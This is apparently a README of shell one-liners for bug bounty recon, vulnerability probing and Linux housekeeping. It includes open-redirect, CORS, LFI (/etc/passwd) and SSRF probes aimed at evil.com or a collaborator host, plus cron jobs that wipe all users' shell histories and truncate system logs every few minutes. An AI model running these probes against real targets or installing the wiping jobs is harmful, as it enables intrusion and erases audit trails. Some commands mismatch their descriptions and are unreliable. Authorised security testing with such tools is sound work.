# Custom One-Liners for Security Research

A curated collection of shell one-liners for bug bounty and general security research. Each section below is collapsible, so expand only what you need.

<details>
<summary><strong>Martian's Nuclei Rover</strong></summary>

I made this only for Nuclei output in order to feed into other tools for improving automation with shell scripting during research

OPTION 1: Run script and direct it to the nuclei file within the system
```bash
awk '{for(i=1;i<=NF;i++) if ($i ~ /^https?:\/\//) {split($i,a,"/"); print a[3]} else if ($i ~ /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/) {print $i}}' nucleifile.txt | sort | uniq > output.txt
```
OPTION 2: Cat results out and pipe the output to awk
```bash
cat nucleifile.txt | awk '{for(i=1;i<=NF;i++) if ($i ~ /^https?:\/\//) {split($i,a,"/"); print a[3]} else if ($i ~ /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/) {print $i}}' | sort | uniq > output.txt
```
- Replace `nucleifile.txt` with your actual filename.

**Script explanation:**

1. **`for(i=1;i<=NF;i++)`**: This `for` loop traverses every field in each line. In `awk`, `NF` is a built-in variable that stores the total number of fields in the current line.
2. **`if ($i ~ /^https?:\/\//)`**: This `if` statement examines each field (`$i`) and checks if it matches the regular expression `^https?:\/\/`. This expression matches any field starting with 'http://' or 'https://'.
3. **`{split($i,a,"/"); print a[3]}`**: If the `if` condition is met, this block of code is executed. The `split` function divides the current field (`$i`) into parts based on the delimiter '/'. These parts are stored in the array `a`. Then, it prints the third element of the array `a`, which is the domain or subdomain part of the URL.
4. **`else if ($i ~ /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/)`**: This `else if` statement checks each field for a match with the regular expression `^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`. This matches fields that look like domain names, which consist of alphanumeric characters, hyphens, or dots, followed by a dot and at least two alphabetic characters.
5. **`{print $i}`**: If the `else if` condition is met, this block of code is executed. It directly prints the field without any changes.

</details>

<details>
<summary><strong>XSSPipeline</strong></summary>

This set of one-liners is tailored to quickly finding potential XSS findings and entry points. Each variation is tailored to different levels of complexity and use cases.

**1. Basic Workflow (Lightweight)**
Quickly identifies potential XSS vulnerabilities with minimal setup.
```bash
echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
```

**2. Standard Workflow (Enhanced Accuracy)**
Incorporates URL validation and response filtering for better precision.
```bash
echo https://example.com/ | gau | gf xss | uro | httpx -silent -mc 200 | Gxss | kxss | tee xss_output.txt
```

**3. Advanced Workflow (Thorough Scanning)**
Leverages advanced payload testing using `dalfox`.
```bash
echo https://example.com/ | gau | gf xss | uro | httpx -silent | dalfox pipe -b collaborator-url | tee xss_output.txt
```

**4. Comprehensive Workflow (Maximum Coverage)**
Combines multiple tools and techniques for comprehensive scanning.
```bash
echo https://example.com/ | (gau; waybackurls; katana) | gf xss | uro | httpx -silent | Gxss | kxss | tee xss_output.txt
```

**5. Modular Workflow (Customizable)**
Adds parameter fuzzing for extended coverage using `ffuf`.
```bash
echo https://example.com/ | gau | gf xss | uro | httpx -silent | ffuf -u FUZZ -w parameters.txt -mc 200 | Gxss | tee xss_output.txt
```

</details>

<details>
<summary><strong>Recon and Subdomain Enumeration</strong></summary>

A set of one-liners for mapping attack surface before anything active happens.

### CertScrape
Pulls subdomains straight from certificate transparency logs, no API key needed.

```bash
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

**How it works:**

1. **`curl -s "https://crt.sh/?q=%25.example.com&output=json"`**: Queries crt.sh. `%25` is a URL-encoded `%`, the wildcard crt.sh uses, so `%.example.com` matches every subdomain seen in logged certificates. `output=json` returns structured results.
2. **`jq -r '.[].name_value'`**: Pulls the `name_value` field (the certificate subject and SAN entries) from each JSON object as raw text.
3. **`sed 's/\*\.//g'`**: Strips wildcard prefixes, so `*.example.com` becomes `example.com`.
4. **`sort -u`**: Deduplicates, since the same host appears across many certificates.

### ResolveLive
Takes a subdomain list, keeps only what actually resolves, and prints the A record.

```bash
dnsx -silent -a -resp -l subs.txt | sort -u
```

### TakeoverHunt
Flags dangling CNAMEs that point at unclaimed third-party services (subdomain takeover candidates).

```bash
dnsx -silent -cname -resp -l subs.txt | grep -iE 'github\.io|herokuapp|s3\.amazonaws|azurewebsites|cloudfront|fastly|pantheon|wpengine|zendesk|readme\.io'
```

**How it works:**

1. **`dnsx -silent -cname -resp -l subs.txt`**: Resolves each host in `subs.txt` and prints its CNAME target.
2. **`grep -iE '...'`**: Keeps only the hosts whose CNAME points at a common SaaS provider. If that provider's resource was never claimed or has been deleted, the dangling CNAME is a takeover candidate worth verifying.

</details>

<details>
<summary><strong>URL and Content Discovery</strong></summary>

Collect, dedupe, and filter URLs so you spend time on live, interesting endpoints.

### UrlHarvest
Merges passive sources, strips duplicates, and keeps only live 200s.

```bash
echo example.com | (gau; waybackurls; katana -silent) 2>/dev/null | uro | httpx -silent -mc 200 | sort -u > live_urls.txt
```

**How it works:**

1. **`echo example.com | (gau; waybackurls; katana -silent)`**: Feeds the domain to three collectors inside a subshell so their combined output flows down one pipe. `gau` and `waybackurls` pull historical URLs; `katana` crawls the live site.
2. **`uro`**: Collapses near-duplicate URLs (same endpoint differing only in parameter values) down to one representative each.
3. **`httpx -silent -mc 200`**: Requests each URL and keeps only those returning HTTP 200.
4. **`sort -u > live_urls.txt`**: Final dedupe into the working file reused by the rest of these one-liners.

### ParamMine
Extracts every unique parameter name seen across a URL list (a solid wordlist seed).

```bash
cat live_urls.txt | unfurl -u keys | sort -u > params.txt
```

### ExtGrep
Buckets URLs by interesting file extension for targeted review.

```bash
cat live_urls.txt | grep -iE '\.(js|json|xml|sql|bak|zip|config|env|log|yml|yaml)(\?|$)' | sort -u
```

</details>

<details>
<summary><strong>Vulnerability Hunting</strong></summary>

Active tests. Only run these against targets you are explicitly authorized to test. Replace `example.com`, `evil.com`, and `YOUR-COLLABORATOR` with your own values.

### RedirectCheck
Tests gf-tagged redirect parameters for open redirect via the Location header.

```bash
cat live_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -location -mc 301,302 | grep -i 'evil.com'
```

**How it works:**

1. **`gf redirect`**: Filters the URL list to parameters commonly tied to redirects (`url=`, `next=`, `return=`, and similar).
2. **`qsreplace 'https://evil.com'`**: Replaces every parameter value with your test URL.
3. **`httpx -silent -location -mc 301,302`**: Requests each one and keeps only responses that redirect (301/302), printing the `Location` header.
4. **`grep -i 'evil.com'`**: Flags the hosts that actually send the browser to your domain, which is the signature of an open redirect.

### LFIProbe
Swaps parameters for `/etc/passwd` and matches a real root entry in the response body.

```bash
cat live_urls.txt | gf lfi | qsreplace '/etc/passwd' | httpx -silent -mr 'root:.*:0:0:'
```

**How it works:**

1. **`gf lfi`**: Narrows to parameters that often reference files (`file=`, `path=`, `page=`, and similar).
2. **`qsreplace '/etc/passwd'`**: Sets each value to a classic path-traversal target.
3. **`httpx -silent -mr 'root:.*:0:0:'`**: `-mr` keeps only responses whose body matches that regex, the real first line of `/etc/passwd`. Matching file contents instead of the path cuts false positives from pages that merely echo the input back.

### CORSAudit
Reflects an arbitrary Origin and flags hosts that trust it.

```bash
while read u; do curl -s -I -H 'Origin: https://evil.com' "$u" | grep -qi 'access-control-allow-origin: https://evil.com' && echo "CORS: $u"; done < live_urls.txt
```

**How it works:**

1. **`while read u; do ... done < live_urls.txt`**: Loops over each URL in the file.
2. **`curl -s -I -H 'Origin: https://evil.com' "$u"`**: Sends a HEAD request spoofing an attacker-controlled Origin and reads the response headers.
3. **`grep -qi 'access-control-allow-origin: https://evil.com'`**: Quietly checks whether the server reflects that untrusted Origin back in its CORS header.
4. **`&& echo "CORS: $u"`**: Prints only the hosts that trust the spoofed Origin, a misconfiguration that can expose authenticated data to any site.

### SSRFSeed
Points SSRF-prone parameters at your collaborator, then watch for out-of-band interactions.

```bash
cat live_urls.txt | gf ssrf | qsreplace 'http://YOUR-COLLABORATOR' | httpx -silent -mc 200,301,302,500
```

### GitExposed
Finds exposed `.git` directories across a host list.

```bash
cat hosts.txt | httpx -silent -path '/.git/HEAD' -mc 200 -mr 'ref:'
```

**How it works:**

1. **`httpx -silent -path '/.git/HEAD'`**: Requests `/.git/HEAD` on every host in the list.
2. **`-mc 200 -mr 'ref:'`**: Keeps only hosts that return 200 and whose body starts with `ref:`, the real content of a Git HEAD file. This confirms a live, readable `.git` directory rather than a catch-all page that returns 200 for everything.

</details>

<details>
<summary><strong>JavaScript and Secret Analysis</strong></summary>

Mine client-side code for keys, tokens, and hidden endpoints.

### JSHunt
Crawls live JS files and greps for likely keys, tokens, and credentials.

```bash
cat live_urls.txt | grep -iE '\.js(\?|$)' | httpx -silent | while read u; do curl -s "$u" | grep -oiE '(api[_-]?key|secret|token|password|authorization|aws_access_key_id|bearer)["'\'' :=]+[A-Za-z0-9._\-]{8,}'; done | sort -u
```

**How it works:**

1. **`grep -iE '\.js(\?|$)'`**: Keeps only JavaScript URLs (ending in `.js`, with or without a query string).
2. **`httpx -silent`**: Confirms each file is live before it is fetched.
3. **`while read u; do curl -s "$u" ...`**: Downloads each JS file in turn.
4. **`grep -oiE '(api[_-]?key|secret|token|...)...'`**: `-o` prints only the matched text. The pattern looks for a secret-like keyword followed by an assignment character (quote, space, colon, or equals) and a value of at least 8 characters.
5. **`sort -u`**: Collapses duplicate hits found across multiple files.

> Treat results as leads, not confirmed secrets. Verify each hit and rotate anything real through the program's disclosure process.

### EndpointPull
Extracts relative and absolute paths referenced inside a JS file for a deeper map.

```bash
curl -s https://example.com/app.js | grep -oiE '["'\''`](/[a-zA-Z0-9_?&=/\-\.]+)["'\''`]' | tr -d '"'\''`' | sort -u
```

**How it works:**

1. **`curl -s https://example.com/app.js`**: Fetches the target script.
2. **`grep -oiE '...'`**: Extracts quoted strings that begin with `/`, which are the paths and endpoints the code references. The character class covers single quotes, double quotes, and backticks.
3. **`tr -d '"'\''`'`**: Strips the surrounding quote characters from each match.
4. **`sort -u`**: Produces a unique list of discovered paths to probe.

</details>

<details>
<summary><strong>Fingerprinting and Hardening Checks</strong></summary>

Quick passive checks on TLS, headers, and favicon identity.

### HeaderAudit
One-shot check for missing security response headers.

```bash
curl -sI https://example.com | grep -iE 'strict-transport-security|content-security-policy|x-frame-options|x-content-type-options|referrer-policy|permissions-policy' || echo 'No security headers found'
```

### CertPeek
Dumps validity dates, subject, and issuer for a TLS endpoint.

```bash
echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -dates -subject -issuer
```

### FaviconHash
Computes the mmh3 favicon hash for Shodan pivoting (`http.favicon.hash:`).

```bash
python3 -c "import mmh3,requests,codecs; r=requests.get('https://example.com/favicon.ico'); print(mmh3.hash(codecs.encode(r.content,'base64')))"
```

**How it works:**

1. **`requests.get('.../favicon.ico')`**: Downloads the site's favicon.
2. **`codecs.encode(r.content,'base64')`**: Base64-encodes the raw bytes, matching how Shodan processes a favicon before hashing.
3. **`mmh3.hash(...)`**: Computes the MurmurHash3 value that Shodan indexes.
4. Pivot in Shodan with `http.favicon.hash:<value>` to find every other host serving the same icon, often the same organization or tech stack. Requires `pip install mmh3 requests`.

</details>

<details>
<summary><strong>General Security Research and Local Triage</strong></summary>

Defensive and local checks that pair with the OPSEC and Wazuh sections below.

### JWTPeek
Decodes a JWT payload without verifying it (base64url-safe).

```bash
echo "$JWT" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq
```

**How it works:**

1. **`awk -F. '{print $2}'`**: Splits the token on `.` and prints the second field, the payload (a JWT is `header.payload.signature`).
2. **`tr '_-' '/+'`**: Converts base64url to standard base64 (`_` becomes `/`, `-` becomes `+`).
3. **`base64 -d 2>/dev/null`**: Decodes the payload. GNU `base64` still emits the decoded bytes when padding is missing, so the padding warning is sent to `/dev/null`.
4. **`jq`**: Pretty-prints the resulting JSON claims. This decodes only; it does not verify the signature.

### ListenAudit
Shows every listening service along with its owning process.

```bash
ss -tulpn | awk 'NR==1 || /LISTEN/'
```

### SuidSweep
Enumerates SUID and SGID binaries for privilege-escalation review.

```bash
find / -xdev -type f -perm -4000 -o -type f -perm -2000 2>/dev/null | sort
```

**How it works:**

1. **`find / -xdev`**: Walks the filesystem from root. `-xdev` stays on one device, so network and virtual mounts are skipped.
2. **`-type f -perm -4000`**: Regular files carrying the SUID bit (they run as the file owner).
3. **`-o -type f -perm -2000`**: Or regular files carrying the SGID bit (they run as the file group).
4. **`2>/dev/null | sort`**: Hides permission-denied noise and sorts the output. Compare it against a known-good baseline; an unexpected SUID binary is a common local privilege-escalation path.

### KeyLeak
Sweeps a directory tree for private keys and credential material before shipping.

```bash
grep -rlE 'BEGIN (RSA|EC|OPENSSH|DSA|PGP) PRIVATE KEY' . 2>/dev/null
```

</details>

<details>
<summary><strong>OPSEC Cron Jobs</strong></summary>

### WhoDoneIt
This script makes a cron job (scheduled task) that ensures histories for bash, zsh, and fish are cleared every 2 minutes for users with home directories under /home/. Adjust the paths and time interval as necessary for your specific requirements.

```bash
(crontab -l 2>/dev/null; echo "*/2 * * * * find /home/ -mindepth 1 -maxdepth 1 -type d \( -exec sh -c 'echo "" > {}/.bash_history' \; -exec sh -c 'echo "" > {}/.zsh_history' \; -exec sh -c 'rm -f {}/.local/share/fish/fish_history' \; \)") | crontab -
```
### PatchMe
This one-liner sets up a cron job to automatically update, upgrade, and reboot your Linux device every Sunday at 3 AM

```bash
(crontab -l 2>/dev/null; echo '0 3 * * 0 bash -c '\''[ -f /etc/os-release ] && . /etc/os-release && case "${ID,,}" in ubuntu|debian|kali|parrot) apt-get update && apt-get upgrade -y ;; arch|blackarch) pacman -Syu --noconfirm ;; amzn) (command -v dnf && dnf -y upgrade || yum -y update) ;; fedora) dnf -y upgrade ;; centos|rhel) yum -y update ;; *) exit 1 ;; esac && reboot'\''') | crontab -
```

### PurgeMe
This one-liner sets up a cronjob to clean up .log files older than 7 days in /var/log, with output and errors logged to /var/log/log-cleanup.log.

(2AM Daily)
```bash
(crontab -l ; echo "0 2 * * * find /var/log -type f -name '*.log' -mtime +2 -exec truncate -s 0 {} + > /var/log/log-cleanup.log 2>&1") | crontab -
```
(every 5 mintues)
```bash
( crontab -l ; echo "*/5 * * * * find /var/log -type f -name '*.log' -mtime +2 -exec truncate -s 0 {} + > /var/log/log-cleanup.log 2> /var/log/log-cleanup.err" ) | crontab -
```

### StripMe
This uses mat2 to remove metadata from user files in Documents, Desktop, and Downloads folders every hour.
```bash
(crontab -l 2>/dev/null; echo "0 * * * * find \$HOME/Documents \$HOME/Desktop \$HOME/Downloads -type f -exec mat2 --in-place {} +") | crontab -
```

**Customizing Cron Schedules**

The cron schedule is defined by the first five fields in the cron expression (`0 3 * * 0`):

- **Minute**: `0` (the 0th minute)
- **Hour**: `3` (3 AM)
- **Day of the Month**: `*` (every day of the month)
- **Month**: `*` (every month)
- **Day of the Week**: `0` (Sunday, where 0 represents Sunday in cron)

**Explanation of Cron Fields**

- **Minute**: `0-59` (the minute of the hour)
- **Hour**: `0-23` (the hour of the day)
- **Day of the Month**: `1-31` (the day of the month)
- **Month**: `1-12` (the month of the year)
- **Day of the Week**: `0-7` (the day of the week, where both 0 and 7 represent Sunday)

</details>

<details>
<summary><strong>Wazuh: Rotated Logs Cleanup</strong></summary>

Cleanup **rotated Wazuh logs** stored under `YEAR/MONTH` directories.
Safe for production: **active logs are not touched**.

### Notes

* Run as **root**
* Requires **GNU find**
* Compatible with Wazuh YEAR/MONTH rotation
* Combine **time-based + size-based** for best results

### Log paths covered

```
/var/ossec/logs/wazuh/
/var/ossec/logs/alerts/
/var/ossec/logs/archives/
/var/ossec/logs/api/
/var/ossec/logs/cluster/
/var/ossec/logs/firewall/
```

### Time-based cleanup (delete logs older than 30 days)

**Dry run**

```bash
find /var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall} -type f -mtime +30
```

**Time-based cleanup cron**

```bash
( crontab -l 2>/dev/null; echo "0 1 * * * find /var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall} -type f -mtime +30 -delete && find /var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall} -type d -empty -delete" ) | crontab -
```

**Manual time-based cleanup**

```bash
find /var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall} -type f -mtime +30 -delete && find /var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall} -type d -empty -delete
```

### Size-based cleanup (keep total usage under 50 GB)

Deletes **oldest rotated files first** until usage is under the limit.

**Dry run (oldest files first)**

```bash
find /var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall} -type f -printf '%TY-%Tm-%Td %p\n' | sort | head
```

**Add size-based cleanup**

```bash
( crontab -l 2>/dev/null; echo "0 2 * * * MAX=50; DIRS=\"/var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall}\"; while [ \"\$(du -sBG \$DIRS 2>/dev/null | awk '{s+=\$1} END{print s+0}')\" -gt \"\$MAX\" ]; do find \$DIRS -type f -printf '%T@ %p\n' | sort -n | head -1 | awk '{print \$2}' | xargs -r rm -f; done" ) | crontab -
```

**Manual size-based cleanup**

```bash
MAX=50; DIRS="/var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall}"; while [ "$(du -sBG $DIRS 2>/dev/null | awk '{s+=$1} END{print s+0}')" -gt "$MAX" ]; do find $DIRS -type f -printf '%T@ %p\n' 2>/dev/null | sort -n | head -1 | awk '{print $2}' | xargs -r rm -f; done
```

**Example cron entries**

Time-based (30 days, daily at 01:00):

```cron
0 1 * * * find /var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall} -type f -mtime +30 -delete && find /var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall} -type d -empty -delete
```

Size-based (50 GB cap, daily at 02:00):

```cron
0 2 * * * MAX=50; DIRS="/var/ossec/logs/{wazuh,alerts,archives,api,cluster,firewall}"; while [ "$(du -sBG $DIRS 2>/dev/null | awk '{s+=$1} END{print s+0}')" -gt "$MAX" ]; do find $DIRS -type f -printf '%T@ %p\n' | sort -n | head -1 | awk '{print $2}' | xargs -r rm -f; done
```

</details>
